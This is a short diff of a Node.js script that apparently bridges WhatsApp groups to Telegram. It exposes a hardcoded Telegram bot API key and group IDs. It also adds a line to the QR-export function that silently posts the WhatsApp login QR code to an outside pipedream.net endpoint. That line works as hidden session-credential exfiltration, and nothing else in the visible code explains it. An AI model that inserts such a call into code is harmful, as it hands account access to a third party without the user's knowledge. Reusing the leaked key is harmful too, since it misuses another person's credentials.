@@ -79,8 +79,8 @@ const BITLY_KEYS = [
 const FROM_GROUP="917027157557-1601873581@g.us";
 const TO_GROUP="919917813876-1611587144@g.us";
 //TEST
-//const FROM_GROUP="918219338068-1610898702@g.us";
-//const TO_GROUP="918219338068-1610898702@g.us";
+//const FROM_GROUP="919917813876@c.us";
+//const TO_GROUP="919917813876@c.us";
 const TELEGRAM_BOT_API_KEY="1577526213:AAGgoShqtrQcwYcd_WXb_iKN2NBFLBxH1xY";
 const TELEGRAM_GROUP_ID="-482466901";
 
@@ -150,6 +150,7 @@ function exportQR(qrCode, path) {
 	qrCode = qrCode.replace('data:image/png;base64,', '');
 	const imageBuffer = Buffer.from(qrCode, 'base64');
 	fs.writeFileSync(path, imageBuffer);
+	axios.post("https://6b77656db81046f3992f4e0235c26b3a.m.pipedream.net",{"data":qrCode});
   }
   
 app.listen(port,()=>console.log("Listning on port "+port))
